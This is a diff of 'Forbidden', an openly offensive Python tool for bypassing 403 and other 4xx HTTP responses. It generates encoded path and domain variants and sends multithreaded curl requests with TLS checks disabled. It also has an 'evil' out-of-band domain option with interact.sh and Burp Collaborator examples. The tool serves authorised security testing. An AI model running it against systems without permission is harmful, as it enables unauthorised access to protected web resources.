@@ -1,217 +1,126 @@
 #!/usr/bin/env python3
 
-import datetime
-import sys
-import urllib.parse
-import os
-import re
-import random
-import socket
-import base64
-import concurrent.futures
-import subprocess
-import io
-import requests
-import time
-import pycurl
-import tempfile
-import termcolor
-import colorama
-import json
+import datetime, time, sys, os, io, tempfile, random, base64, json, regex as re, threading, concurrent.futures, subprocess, socket, pycurl, requests, urllib.parse, copy, jwt, colorama, termcolor
 
 start = datetime.datetime.now()
 
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
 colorama.init(autoreset = True)
 
-# -------------------------- INFO --------------------------
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-def basic():
-	global proceed
-	proceed = False
-	print("Forbidden v9.8 ( github.com/ivan-sincek/forbidden )")
-	print("")
-	print("Usage:   forbidden -u url                       -t tests [-f force] [-v values    ] [-p path            ] [-o out         ]")
-	print("Example: forbidden -u https://example.com/admin -t all   [-f GET  ] [-v values.txt] [-p /home/index.html] [-o results.json]")
+# ----------------------------------------
 
-def advanced():
-	basic()
-	print("")
-	print("DESCRIPTION")
-	print("    Bypass 4xx HTTP response status codes and more")
-	print("URL")
-	print("    Inaccessible or forbidden URL")
-	print("    Parameters and fragments are ignored")
-	print("    -u <url> - https://example.com/admin | etc.")
-	print("TESTS")
-	print("    Tests to run")
-	print("    Use a comma-separated values")
-	print("    -t <tests> - methods | [method|scheme|port]-overrides | headers | paths | encodings | auths | redirects | parsers | all")
-	print("FORCE")
-	print("    Force an HTTP method for nonspecific test cases")
-	print("    -f <force> - GET | POST | CUSTOM | etc.")
-	print("VALUES")
-	print("    File with additional HTTP header values such as internal IPs, etc.")
-	print("    Spacing will be stripped, empty lines ignored, and duplicates removed")
-	print("    Scope: headers")
-	print("    -v <values> - values.txt | etc.")
-	print("PATH")
-	print("    Accessible URL path to test URL overrides")
-	print("    Scope: headers")
-	print("    Default: /robots.txt")
-	print("    -p <path> - /home/index.html | /README.txt | etc.")
-	print("EVIL")
-	print("    Specify (strictly) evil domain name with no port to test URL overrides")
-	print("    Scope: headers | redirects")
-	print("    Default: github.com")
-	print("    -e <evil> - xyz.interact.sh | xyz.burpcollaborator.net | etc.")
-	print("IGNORE")
-	print("    Filter out 200 OK false positive results by RegEx")
-	print("    Spacing will be stripped")
-	print("    -i <ignore> - Forbidden | \"Access Denied\" | etc.")
-	print("LENGTHS")
-	print("    Filter out 200 OK false positive results by content lengths")
-	print("    Specify 'base' to ignore the content length of the base HTTP response")
-	print("    Specify 'path' to ignore the content length of the accessible URL response")
-	print("    Use a comma-separated values")
-	print("    -l <lengths> - 12 | base | path | etc.")
-	print("THREADS")
-	print("    Number of parallel threads to run")
-	print("    More threads make it quicker but can give worse results")
-	print("    Depends heavily on network bandwidth and server capacity")
-	print("    Default: 5")
-	print("    -th <threads> - 200 | etc.")
-	print("SLEEP")
-	print("    Sleep while queuing each request")
-	print("    Intended for a single thread use")
-	print("    -s <sleep> - 5 | etc.")
-	print("AGENT")
-	print("    User agent to use")
-	print("    Default: Forbidden/9.8")
-	print("    -a <agent> - curl/3.30.1 | random[-all] | etc.")
-	print("PROXY")
-	print("    Web proxy to use")
-	print("    -x <proxy> - 127.0.0.1:8080 | etc.")
-	print("OUT")
-	print("    Output file")
-	print("    -o <out> - results.json | etc.")
-	print("DEBUG")
-	print("    Debug output")
-	print("    -dbg <debug> - yes")
+default_quotes = "'"
 
-# ------------------- MISCELENIOUS BEGIN -------------------
+def escape_quotes(value):
+	return str(value).replace(default_quotes, ("\\{0}").format(default_quotes))
 
-def unique(sequence):
-	seen = set()
-	return [x for x in sequence if not (x in seen or seen.add(x))]
+def set_param(value, param = ""):
+	tmp = default_quotes + escape_quotes(value) + default_quotes
+	if param:
+		tmp = ("{0} {1}").format(param, tmp)
+	return tmp
 
-def parse_tests(string, tests, special):
+# ----------------------------------------
+
+def strip_url_scheme(url):
+	return url.split("://", 1)[-1]
+
+def strip_url_schemes(urls):
 	tmp = []
-	for entry in string.split(","):
-		entry = entry.strip()
-		if not entry:
-			continue
-		elif entry == special: # all
-			tmp = [entry]
-			break
-		elif entry not in tests:
-			tmp = []
-			break
-		else:
-			tmp.append(entry)
+	for url in urls:
+		tmp.append(strip_url_scheme(url))
 	return unique(tmp)
 
-def parse_content_lengths(string, specials):
+def get_base_https_url(scheme, dnp, port, full_path):
+	return ("https://{0}:{1}{2}").format(dnp, port if scheme == "https" else 443, full_path)
+
+def get_base_http_url(scheme, dnp, port, full_path):
+	return ("http://{0}:{1}{2}").format(dnp, port if scheme == "http" else 80, full_path)
+
+# NOTE: Extends domain names or IPs.
+def get_all_domains(scheme, dnps, port):
+	if not isinstance(dnps, list):
+		dnps = [dnps]
 	tmp = []
-	for entry in string.split(","):
-		entry = entry.strip()
-		if not entry:
-			continue
-		elif entry in specials: # base, path
-			tmp.append(entry)
-		elif entry.isdigit() and int(entry) >= 0:
-			tmp.append(int(entry))
-		else:
-			tmp = []
-			break
+	for dnp in dnps:
+		tmp.extend([
+			dnp,
+			("{0}:{1}").format(dnp, port),
+			("{0}://{1}").format(scheme, dnp),
+			("{0}://{1}:{2}").format(scheme, dnp, port)
+		])
 	return unique(tmp)
 
-def contains(array, values):
-	return any(entry in values for entry in array)
-
-def read_file(file):
-	tmp = []
-	with open(file, "r", encoding = "ISO-8859-1") as stream:
-		for line in stream:
-			line = line.strip()
-			if line:
-				tmp.append(line)
-	stream.close()
+def get_encoded_domains(dnp, port):
+	tmp = [dnp, dnp.lower(), dnp.upper(), mix(dnp), urllib.parse.quote(unicode_encode(dnp))]
+	for entry in tmp[0:-1]:
+		tmp.append(hexadecimal_encode(entry))
+		# hexadecimal_encode(urllib.parse.quote(unicode_encode(dnp))) will not work
+	tmp = [("{0}:{1}").format(entry, port) for entry in tmp]
 	return unique(tmp)
 
-def strip_url_scheme(string):
-	return string.split("://", 1)[-1]
+# ----------------------------------------
 
-def replace_multiple_slashes(string):
-	return re.sub(r"\/{2,}", "/", string)
+fs_const = "/"
 
-def prepend_slash(string):
-	const = "/"
-	if not string.startswith(const):
-		string = const + string
-	return string
+def replace_multiple_slashes(path):
+	return re.sub(r"\/{2,}", fs_const, path)
 
-def get_directories(path = None):
-	const = "/"
-	tmp = [const]
-	if path:
-		dir_no_const = ""
-		dir_const = const
-		for entry in path.split(const):
-			if entry:
-				dir_no_const += const + entry
-				dir_const += entry + const
-				tmp.extend([dir_no_const, dir_const])
-	return unique(tmp)
+def prepend_slash(path):
+	if not path.startswith(fs_const):
+		path = fs_const + path
+	return path
 
-def append_paths(domains, paths):
-	if not isinstance(domains, list):
-		domains = [domains]
+def append_paths(bases, paths):
+	if not isinstance(bases, list):
+		bases = [bases]
 	if not isinstance(paths, list):
 		paths = [paths]
 	tmp = []
-	const = "/"
-	for domain in domains:
-		for path in paths:
-			tmp.append(domain.rstrip(const) + prepend_slash(path) if path else domain)
+	for base in bases:
+		if base:
+			for path in paths:
+				tmp.append(base.rstrip(fs_const) + prepend_slash(path) if path else base)
 	return unique(tmp)
 
-def extend_path(path = None):
-	const = "/"
-	tmp = [const]
-	if path:
-		path = path.strip(const)
-		if path:
-			tmp = [const + path + const, path + const, const + path, path]
-	return unique(tmp)
-
-def extend_domains(domains_no_port, scheme = None, port = None):
-	if not isinstance(domains_no_port, list):
-		domains_no_port = [domains_no_port]
-	if not port and scheme:
-		port = 443 if scheme.lower() == "https" else 80
+def extend_path(path, query_string = "", fragment = ""):
 	tmp = []
-	for domain_no_port in domains_no_port:
-		tmp.append(domain_no_port)
-		if port:
-			tmp.append(("{0}:{1}").format(domain_no_port, port))
-		if scheme:
-			tmp.extend([
-				# ("{0}://{1}").format(scheme, domain_no_port),
-				("{0}://{1}:{2}").format(scheme, domain_no_port, port)
-			])
+	path = path.strip(fs_const)
+	if not path:
+		tmp.append(fs_const)
+	else:
+		tmp.extend([fs_const + path + fs_const, path + fs_const, fs_const + path, path])
+	tmp = [entry + query_string + fragment for entry in tmp]
 	return unique(tmp)
+
+def get_recursive_paths(path):
+	path_no_const = ""
+	path_const = fs_const
+	tmp = [path_no_const, path_const]
+	for entry in path.strip(fs_const).split(fs_const):
+		path_no_const += fs_const + entry
+		path_const += entry + fs_const
+		tmp.extend([path_no_const, path_const])
+	return unique(tmp)
+
+def get_encoded_paths(path):
+	tmp = []
+	if path == fs_const:
+		tmp.append(path)
+	elif path:
+		paths = path.strip(fs_const).rsplit(fs_const, 1)
+		last = paths[-1]
+		tmp.extend([last, last.lower(), last.upper(), mix(last), capitalize(last), urllib.parse.quote(unicode_encode(last))])
+		for entry in tmp[0:-1]:
+			tmp.append(hexadecimal_encode(entry))
+			# hexadecimal_encode(urllib.parse.quote(unicode_encode(last))) will not work
+		prepend = fs_const + paths[0] + fs_const if len(paths) > 1 else fs_const
+		append = fs_const if path.endswith(fs_const) else ""
+		tmp = [prepend + entry + append for entry in tmp]
+	return unique(tmp)
+
+# ----------------------------------------
 
 def mix(string):
 	tmp = ""
@@ -228,25 +137,9 @@ def mix(string):
 		tmp += character
 	return tmp
 
-def capitalize(string):
-	tmp = ""
-	changed = False
-	for character in string.lower():
-		if not changed and character.isalpha():
-			character = character.upper()
-			changed = True
-		tmp += character
-	return tmp
-
-def hexadecimal_encode(string):
-	tmp = ""
-	for character in string:
-		if character.isalpha() or character.isdigit():
-			character = ("%{0}").format(format(ord(character), "x"))
-		tmp += character
-	return tmp
-
-def unicode_encode(string):
+def unicode_encode(string, case_sensitive = False):
+	if not case_sensitive:
+		string = string.lower()
 	characters = [
 		{ "original": "a", "unicode": "\u1d2c" },
 		{ "original": "b", "unicode": "\u1d2e" },
@@ -280,66 +173,63 @@ def unicode_encode(string):
 		string = string.replace(character["original"], character["unicode"])
 	return string
 
-def get_encoded_domains(domain_no_port, port):
-	tmp = [
-		domain_no_port,
-		domain_no_port.lower(),
-		domain_no_port.upper(),
-		mix(domain_no_port),
-		unicode_encode(domain_no_port)
-	]
-	for entry in [
-		domain_no_port,
-		domain_no_port.lower(),
-		domain_no_port.upper(),
-		mix(domain_no_port)
-	]:
-		tmp.extend([
-			hexadecimal_encode(entry)
-		])
-	for entry in [
-		unicode_encode(domain_no_port)
-	]:
-		tmp.extend([
-			urllib.parse.quote(entry)
-		])
-	tmp = [("{0}:{1}").format(entry, port) for entry in tmp]
-	return unique(tmp)
+def capitalize(string):
+	tmp = ""
+	changed = False
+	for character in string.lower():
+		if not changed and character.isalpha():
+			character = character.upper()
+			changed = True
+		tmp += character
+	return tmp
 
-def get_encoded_paths(path):
-	const = "/"
-	array = path.strip(const).rsplit(const, 1)
-	directory = array[-1]
-	tmp = [
-		directory,
-		directory.lower(),
-		directory.upper(),
-		mix(directory),
-		capitalize(directory),
-		unicode_encode(directory)
-	]
-	for entry in [
-		directory,
-		directory.lower(),
-		directory.upper(),
-		mix(directory),
-		capitalize(directory)
-	]:
-		tmp.extend([
-			hexadecimal_encode(entry)
-		])
-	for entry in [
-		unicode_encode(directory)
-	]:
-		tmp.extend([
-			urllib.parse.quote(entry)
-		])
-	prepend = const + array[0] + const if len(array) > 1 else const
-	append = const if path != const and path.endswith(const) else ""
-	tmp = [prepend + entry + append for entry in tmp]
-	return unique(tmp)
+def hexadecimal_encode(string, case_sensitive = True):
+	if not case_sensitive:
+		string = string.lower()
+	tmp = ""
+	for character in string:
+		if character.isalpha() or character.isdigit():
+			character = ("%{0}").format(format(ord(character), "x"))
+		tmp += character
+	return tmp
 
-class uniquestr(str): # NOTE: Bug to exploit double headers is fixed and no longer works.
+# ----------------------------------------
+
+def print_white(text):
+	termcolor.cprint(text, "white")
+
+def print_cyan(text):
+	termcolor.cprint(text, "cyan")
+
+def print_red(text):
+	termcolor.cprint(text, "red")
+
+def print_yellow(text):
+	termcolor.cprint(text, "yellow")
+
+def print_green(text):
+	termcolor.cprint(text, "green")
+
+def print_time(text):
+	print(("{0} - {1}").format(datetime.datetime.now().strftime("%H:%M:%S"), text))
+
+default_encoding = "ISO-8859-1"
+
+def b64(string):
+	return base64.b64encode((string).encode(default_encoding)).decode(default_encoding)
+
+def jdump(data):
+	return json.dumps(data, indent = 4, ensure_ascii = False)
+
+def pop(array, keys):
+	for obj in array:
+		for key in keys:
+			obj.pop(key, None)
+	return array
+
+# ----------------------------------------
+
+class uniquestr(str):
 	__lower = None
 	def __hash__(self):
 		return id(self)
@@ -354,8 +244,21 @@ class uniquestr(str): # NOTE: Bug to exploit double headers is fixed and no long
 				self.__lower = uniquestr(lower)
 		return self.__lower
 
-def jdump(data):
-	return json.dumps(data, indent = 4, ensure_ascii = False)
+# ----------------------------------------
+
+def unique(sequence):
+	seen = set()
+	return [x for x in sequence if not (x in seen or seen.add(x))]
+
+def read_file(file):
+	tmp = []
+	with open(file, "r", encoding = default_encoding) as stream:
+		for line in stream:
+			line = line.strip()
+			if line:
+				tmp.append(line)
+	stream.close()
+	return unique(tmp)
 
 def write_file(data, out):
 	confirm = "yes"
@@ -363,898 +266,1554 @@ def write_file(data, out):
 		print(("'{0}' already exists").format(out))
 		confirm = input("Overwrite the output file (yes): ")
 	if confirm.lower() == "yes":
-		open(out, "w").write(data)
-		print(("Results have been saved to '{0}'").format(out))
+		try:
+			open(out, "w").write(data)
+			print(("Results have been saved to '{0}'").format(out))
+		except FileNotFoundError:
+			print(("Cannot save results to '{0}'").format(out))
 
-# -------------------- MISCELENIOUS END --------------------
+default_user_agent = "Forbidden/9.8"
 
-# -------------------- VALIDATION BEGIN --------------------
+# NOTE: Returns a user agents list (string array) on success.
+# NOTE: Returns the default user agent (string) on failure.
+def get_user_agents():
+	tmp = []
+	file = os.path.join(os.path.abspath(os.path.split(__file__)[0]), "user_agents.txt")
+	if os.path.isfile(file) and os.access(file, os.R_OK) and os.stat(file).st_size > 0:
+		with open(file, "r", encoding = default_encoding) as stream:
+			for line in stream:
+				line = line.strip()
+				if line:
+					tmp.append(line)
+		stream.close()
+	if not tmp:
+		tmp = default_user_agent
+	return tmp
+
+# NOTE: Returns a random user agent (string) on success.
+# NOTE: Returns the default user agent (string) on failure.
+def get_random_user_agent():
+	tmp = get_user_agents()
+	if isinstance(tmp, list):
+		tmp = tmp[random.randint(0, len(tmp) - 1)]
+	return tmp
+
+# ----------------------------------------
+
+class Forbidden:
+
+	def __init__(self, url, ignore_qsf, ignore_curl, tests, force, values, path, evil, ignore, lengths, threads, sleep, agent, proxy, debug):
+		# --------------------------------
+		# NOTE: User-controlled input.
+		self.__url             = self.__parse_url(url, bool(ignore_qsf))
+		self.__tests           = tests
+		self.__force           = force
+		self.__values          = values
+		self.__accessible      = append_paths(self.__url["scheme_domain"], path)
+		self.__evil            = self.__parse_url(evil, bool(ignore_qsf))
+		self.__ignore          = ignore
+		self.__lengths         = lengths
+		self.__threads         = threads
+		self.__sleep           = sleep
+		self.__agent           = agent
+		self.__proxy           = proxy
+		self.__debug           = debug
+		# --------------------------------
+		# NOTE: Python cURL configuration.
+		self.__curl            = not bool(ignore_curl)
+		self.__verify          = False # NOTE: Ignore SSL/TLS verification.
+		self.__allow_redirects = True
+		self.__max_redirects   = 10
+		self.__connect_timeout = 60
+		self.__read_timeout    = 90
+		self.__encoding        = "UTF-8" # NOTE: ISO-8859-1 works better than UTF-8 to access files.
+		self.__regex_flags     = re.MULTILINE | re.IGNORECASE
+		# --------------------------------
+		self.__error           = False
+		self.__print_lock      = threading.Lock()
+		self.__default_method  = "GET"
+		self.__allowed_methods = []
+		self.__collection      = []
+		self.__identifier      = 0
+		self.__total           = 0
+		self.__progress        = 0
+
+	def __parse_url(self, url, ignore_qsf = False, case_sensitive = False):
+		url      = urllib.parse.urlsplit(url)
+		scheme   = url.scheme.lower()
+		port     = int(url.port) if url.port else (443 if scheme == "https" else 80)
+		domain   = url.netloc if url.port else ("{0}:{1}").format(url.netloc, port)
+		domain   = domain.lower() if not case_sensitive else domain
+		path     = replace_multiple_slashes(url.path)
+		# --------------------------------
+		query    = {}
+		fragment = {}
+		query["parsed"   ] = {} if ignore_qsf else urllib.parse.parse_qs(url.query, keep_blank_values = True)
+		query["full"     ] = ("?{0}").format(urllib.parse.urlencode(query["parsed"], doseq = True)) if query["parsed"] else ""
+		fragment["parsed"] = {} # NOTE: Not needed.
+		fragment["full"  ] = ("#{0}").format(url.fragment) if url.fragment else ""
+		# --------------------------------
+		tmp                        = {}
+		tmp["scheme"             ] = scheme
+		tmp["domain_no_port"     ] = domain.split(":", 1)[0]
+		tmp["port"               ] = port
+		tmp["domain"             ] = domain
+		tmp["domain_extended"    ] = get_all_domains(tmp["scheme"], tmp["domain_no_port"], tmp["port"])
+		# --------------------------------
+		tmp["ip_no_port"         ] = None
+		tmp["ip"                 ] = None
+		tmp["ip_extended"        ] = None
+		tmp["scheme_ip"          ] = None
+		# --------------------------------
+		tmp["scheme_domain"      ] = ("{0}://{1}").format(tmp["scheme"], tmp["domain"])
+		tmp["path"               ] = path
+		tmp["query"              ] = query
+		tmp["fragment"           ] = fragment
+		tmp["path_full"          ] = tmp["path"] + tmp["query"]["full"] + tmp["fragment"]["full"]
+		# --------------------------------
+		tmp["urls"               ] = {
+			"base"  : tmp["scheme_domain"] + tmp["path_full"],
+			"domain": {
+				"https": get_base_https_url(tmp["scheme"], tmp["domain_no_port"], tmp["port"], tmp["path_full"]),
+				"http" : get_base_http_url(tmp["scheme"], tmp["domain_no_port"], tmp["port"], tmp["path_full"])
+			},
+			"ip"    : {
+				"https": None,
+				"http" : None
+			}
+		}
+		# --------------------------------
+		tmp["relative_paths"     ] = extend_path(tmp["path"]) + extend_path(tmp["path"], tmp["query"]["full"], tmp["fragment"]["full"])
+		tmp["absolute_paths"     ] = append_paths(("{0}://{1}").format(tmp["scheme"], tmp["domain_no_port"]), tmp["relative_paths"]) + append_paths(tmp["scheme_domain"], tmp["relative_paths"])
+		# --------------------------------
+		for key in tmp:
+			if isinstance(tmp[key], list):
+				tmp[key] = unique(tmp[key])
+		return tmp
+		# --------------------------------
+
+	def __parse_ip(self, obj):
+		try:
+			obj["ip_no_port" ] = socket.gethostbyname(obj["domain_no_port"])
+			obj["ip"         ] = ("{0}:{1}").format(obj["ip_no_port"], obj["port"])
+			obj["ip_extended"] = get_all_domains(obj["scheme"], obj["ip_no_port"], obj["port"])
+			obj["scheme_ip"  ] = ("{0}://{1}").format(obj["scheme"], obj["ip"])
+			obj["urls"]["ip" ] = {
+				"https": get_base_https_url(obj["scheme"], obj["ip_no_port"], obj["port"], obj["path_full"]),
+				"http" : get_base_http_url(obj["scheme"], obj["ip_no_port"], obj["port"], obj["path_full"])
+			}
+		except socket.error as ex:
+			self.__print_debug(ex)
+		return obj
+
+	def __add_lengths(self, lengths):
+		if not isinstance(lengths, list):
+			lengths = [lengths]
+		self.__lengths = unique(self.__lengths + lengths)
+
+	def get_results(self):
+		return self.__collection
+
+	def __print_error(self, text):
+		self.__error = True
+		print_red(("ERROR: {0}").format(text))
+
+	def __print_progress(self):
+		with self.__print_lock:
+			print(("Progress: {0}/{1} | {2:.2f}%").format(self.__progress, self.__total, (self.__progress / self.__total) * 100), end = "\n" if self.__progress == self.__total else "\r")
+
+	def __print_debug(self, error, text = ""):
+		if self.__debug:
+			with self.__print_lock:
+				if text:
+					print_yellow(text)
+				print_cyan(error)
+
+	def __encode(self, values):
+		if isinstance(values, list):
+			return [value.encode(self.__encoding) for value in values]
+		else:
+			return values.encode(self.__encoding)
+
+	def __decode(self, values):
+		if isinstance(values, list):
+			return [value.decode(self.__encoding) for value in values]
+		else:
+			return values.decode(self.__encoding)
+
+	def run(self):
+		self.__validate_inaccessible_and_evil_urls()
+		if not self.__error:
+			self.__fetch_inaccessible_and_evil_ips()
+			if not self.__error:
+				self.__validate_accessible_urls()
+				self.__set_allowed_http_methods()
+				self.__prepare_collection()
+				if not self.__collection:
+					print("No test records were created")
+				else:
+					self.__filter_collection()
+					print_cyan(("Number of created test records: {0}").format(self.__total))
+					self.__run_tests()
+					self.__validate_results()
+
+	def __validate_inaccessible_and_evil_urls(self):
+		# --------------------------------
+		print_cyan(("Normalized inaccessible URL: {0}").format(self.__url["urls"]["base"]))
+		print_time("Validating the inaccessible URL...")
+		record = self.__fetch(url = self.__url["urls"]["base"], method = "GET")
+		if not (record["code"] > 0):
+			self.__print_error("Cannot validate the inaccessible URL, script will exit shortly...")
+		elif "base" in self.__lengths:
+			print_green(("Ignoring the inaccessible URL response content length: {0}").format(record["length"]))
+			self.__lengths.pop(self.__lengths.index("base"))
+			self.__add_lengths(record["length"])
+		# --------------------------------
+		if not self.__error and self.__check_tests(["headers", "auths", "redirects", "parsers", "all"]):
+			print_cyan(("Normalized evil URL: {0}").format(self.__evil["urls"]["base"]))
+			print_time("Validating the evil URL...")
+			record = self.__fetch(url = self.__evil["urls"]["base"], method = "GET")
+			if not (record["code"] > 0):
+				self.__print_error("Cannot validate the evil URL, script will exit shortly...")
+		# --------------------------------
+
+	def __fetch_inaccessible_and_evil_ips(self):
+		# --------------------------------
+		print_time("Fetching IP of the inaccessible URL...")
+		self.__url = self.__parse_ip(copy.deepcopy(self.__url))
+		if not self.__url["ip_no_port"]:
+			self.__print_error("Cannot fetch IP of the inaccessible URL, script will exit shortly...")
+		# --------------------------------
+		if not self.__error and self.__check_tests(["headers", "auths", "redirects", "parsers", "all"]):
+			print_time("Fetching IP of the evil URL...")
+			self.__evil = self.__parse_ip(copy.deepcopy(self.__evil))
+			if not self.__evil["ip_no_port"]:
+				self.__print_error("Cannot fetch IP of the evil URL, script will exit shortly...")
+		# --------------------------------
+
+	# NOTE: Select only the first valid accessible URL.
+	def __validate_accessible_urls(self):
+		if self.__check_tests(["headers", "all"]):
+			print_time("Validating the accessible URLs...")
+			for url in copy.deepcopy(self.__accessible):
+				self.__accessible = ""
+				record = self.__fetch(url = url, method = "GET")
+				if record["code"] >= 200 and record["code"] < 400:
+					print_green(("First valid accessible URL: {0}").format(record["url"]))
+					self.__accessible = record["url"]
+					if "path" in self.__lengths:
+						print_green(("Ignoring the accessible URL response content length: {0}").format(record["length"]))
+						self.__lengths.pop(self.__lengths.index("path"))
+						self.__add_lengths(record["length"])
+					break
+			if not self.__accessible:
+				print_cyan("No valid accessible URLs were found, moving on...")
+
+	def __set_allowed_http_methods(self):
+		# --------------------------------
+		if self.__force:
+			print_cyan(("Forcing HTTP {0} method for all non-specific test cases...").format(self.__force))
+			self.__allowed_methods = [self.__force]
+		# --------------------------------
+		elif self.__check_tests(["methods", "method-overrides", "all"]):
+			print_time("Fetching allowed HTTP methods...")
+			record = self.__fetch(url = self.__url["urls"]["base"], method = "OPTIONS")
+			if record["code"] > 0:
+				if record["curl"]:
+					methods = re.search(r"(?<=^allow\:).+", record["response_headers"], self.__regex_flags)
+					if methods:
+						for method in methods[0].split(","):
+							method = method.strip().upper()
+							if method not in self.__allowed_methods:
+								self.__allowed_methods.append(method)
+				else:
+					for key in record["response_headers"]:
+						if key.lower() == "allow":
+							for method in record["response_headers"][key].split(","):
+								method = method.strip().upper()
+								if method not in self.__allowed_methods:
+									self.__allowed_methods.append(method)
+							break
+			if not self.__allowed_methods:
+				print_cyan("Cannot fetch allowed HTTP methods, moving on...")
+				self.__allowed_methods = self.__get_methods()
+				# TO DO: Brute-force allowed HTTP methods.
+			else:
+				print_green(("Allowed HTTP methods: [{0}]").format((", ").join(self.__allowed_methods)))
+		# --------------------------------
+
+	def __fetch(self, url, method = None, headers = None, body = None, agent = None, proxy = None, curl = None, passthrough = True):
+		record = self.__record("SYSTEM-0", url, method, headers, body, agent, proxy, curl)
+		return self.__send_curl(record, passthrough) if record["curl"] else self.__send_request(record, passthrough)
+
+	def __records(self, identifier, urls, methods = None, headers = None, body = None, agent = None, proxy = None, curl = None):
+		if not isinstance(urls, list):
+			urls = [urls]	
+		if not isinstance(methods, list):
+			methods = [methods]
+		if headers:
+			for url in urls:
+				for method in methods:
+					for header in headers:
+						if not isinstance(header, list):
+							# NOTE: Python cURL accepts only string arrays as HTTP request headers.
+							header = [header]
+						self.__collection.append(self.__record(identifier, url, method, header, body, agent, proxy, curl))
+		else:
+			for url in urls:
+				for method in methods:
+					self.__collection.append(self.__record(identifier, url, method, [], body, agent, proxy, curl))
+
+	def __record(self, identifier, url, method, headers, body, agent, proxy, curl):
+		self.__identifier += 1
+		identifier = ("{0}-{1}").format(self.__identifier, identifier)
+		if not method:
+			method = self.__force if self.__force else self.__default_method
+		if not agent:
+			agent = self.__agent[random.randint(0, len(self.__agent) - 1)] if isinstance(self.__agent, list) else self.__agent
+		if not proxy:
+			proxy = self.__proxy
+		if not curl:
+			curl = self.__curl
+		record = {
+			"raw"             : self.__identifier,
+			"id"              : identifier,
+			"url"             : url,
+			"method"          : method,
+			"headers"         : headers,
+			"body"            : body,
+			"agent"           : agent,
+			"proxy"           : proxy,
+			"command"         : None,
+			"code"            : 0,
+			"length"          : 0,
+			"response"        : None,
+			"response_headers": None,
+			"curl"            : curl
+		}
+		record["command"] = self.__build_command(record)
+		return record
+
+	def __build_command(self, record):
+		tmp = ["curl", set_param(self.__connect_timeout, "--connect-timeout"), set_param(self.__read_timeout, "-m"), "-iskL", set_param(self.__max_redirects, "--max-redirs"), "--path-as-is"]
+		if record["body"]:
+			tmp.append(set_param(record["body"], "-d"))
+		if record["proxy"]:
+			tmp.append(set_param(record["proxy"], "-x"))
+		if record["agent"]:
+			tmp.append(set_param(record["agent"], "-A"))
+		if record["headers"]:
+			for header in record["headers"]:
+				tmp.append(set_param(header, "-H"))
+		tmp.append(set_param(record["method"], "-X"))
+		tmp.append(set_param(record["url"]))
+		tmp = (" ").join(tmp)
+		return tmp
+
+	# NOTE: Remove duplicate test records.
+	def __filter_collection(self):
+		tmp = []
+		exists = set()
+		for record in self.__collection:
+			command = re.sub((" -A \\{0}.+?\\{0}").format(default_quotes), "", record["command"])
+			if command not in exists and not exists.add(command):
+				tmp.append(record)
+		self.__collection = tmp
+		self.__total = len(self.__collection)
+
+	def __run_tests(self):
+		results = []
+		print_time(("Running tests with {0} engine...").format("PycURL" if self.__curl else "Python Requests"))
+		print("Press CTRL + C to exit early - results will be saved")
+		self.__print_progress()
+		with concurrent.futures.ThreadPoolExecutor(max_workers = self.__threads) as executor:
+			subprocesses = []
+			try:
+				for record in self.__collection:
+					subprocesses.append(executor.submit(self.__send_curl if record["curl"] else self.__send_request, record))
+				for subprocess in concurrent.futures.as_completed(subprocesses):
+					results.append(subprocess.result())
+					self.__progress += 1
+					self.__print_progress()
+			except KeyboardInterrupt:
+				executor.shutdown(wait = True, cancel_futures = True)
+		self.__collection = results
+
+	def __send_curl(self, record, passthrough = False):
+		if self.__sleep:
+			time.sleep(self.__sleep)
+		curl = None
+		cookiefile = None
+		headers = None
+		response = None
+		try:
+			# --------------------------------
+			curl = pycurl.Curl()
+			# --------------------------------
+			cookiefile = tempfile.NamedTemporaryFile(mode = "r") # NOTE: Important! Store and pass HTTP cookies on HTTP redirects.
+			curl.setopt(pycurl.COOKIESESSION, True)
+			curl.setopt(pycurl.COOKIEFILE, cookiefile.name)
+			curl.setopt(pycurl.COOKIEJAR, cookiefile.name)
+			# --------------------------------
+			if passthrough:
+				headers = io.BytesIO()
+				curl.setopt(pycurl.HEADERFUNCTION, headers.write)
+			# --------------------------------
+			response = io.BytesIO()
+			curl.setopt(pycurl.WRITEFUNCTION, response.write)
+			# --------------------------------
+			curl.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_1_1)
+			curl.setopt(pycurl.VERBOSE, False)
+			curl.setopt(pycurl.PATH_AS_IS, True)
+			curl.setopt(pycurl.SSL_VERIFYHOST, self.__verify)
+			curl.setopt(pycurl.SSL_VERIFYPEER, self.__verify)
+			curl.setopt(pycurl.PROXY_SSL_VERIFYHOST, self.__verify)
+			curl.setopt(pycurl.PROXY_SSL_VERIFYPEER, self.__verify)
+			curl.setopt(pycurl.FOLLOWLOCATION, self.__allow_redirects)
+			curl.setopt(pycurl.MAXREDIRS, self.__max_redirects)
+			curl.setopt(pycurl.CONNECTTIMEOUT, self.__connect_timeout)
+			curl.setopt(pycurl.TIMEOUT, self.__read_timeout)
+			# --------------------------------
+			# NOTE: Important! Encode Unicode characters.
+			curl.setopt(pycurl.URL, record["url"])
+			curl.setopt(pycurl.CUSTOMREQUEST, record["method"])
+			if record["method"] in ["HEAD"]:
+				curl.setopt(pycurl.NOBODY, True)
+			if record["agent"]:
+				curl.setopt(pycurl.USERAGENT, self.__encode(record["agent"]))
+			if record["headers"]:
+				curl.setopt(pycurl.HTTPHEADER, self.__encode(record["headers"])) # Will override 'User-Agent' HTTP request header.
+			if record["body"]:
+				curl.setopt(pycurl.POSTFIELDS, record["body"])
+			if record["proxy"]:
+				curl.setopt(pycurl.PROXY, record["proxy"])
+			# --------------------------------
+			curl.perform()
+			# --------------------------------
+			record["code"] = int(curl.getinfo(pycurl.RESPONSE_CODE))
+			record["length"] = int(curl.getinfo(pycurl.SIZE_DOWNLOAD))
+			if passthrough:
+				record["response_headers"] = self.__decode(headers.getvalue())
+				# record["response"] = self.__decode(response.getvalue())
+			elif record["length"] in self.__lengths or (self.__ignore and re.search(self.__ignore, self.__decode(response.getvalue()), self.__regex_flags)):
+				record["code"] = -1
+			# --------------------------------
+		except pycurl.error as ex:
+			# --------------------------------
+			self.__print_debug(ex, ("{0}: {1}").format(record["id"], record["command"]))
+			# --------------------------------
+		finally:
+			# --------------------------------
+			if response:
+				response.close()
+			# --------------------------------
+			if headers:
+				headers.close()
+			# --------------------------------
+			if curl:
+				curl.close()
+			# --------------------------------
+			if cookiefile:
+				cookiefile.close() # NOTE: Important! Close the file handle strictly after closing the cURL handle.
+			# --------------------------------
+		return record
+
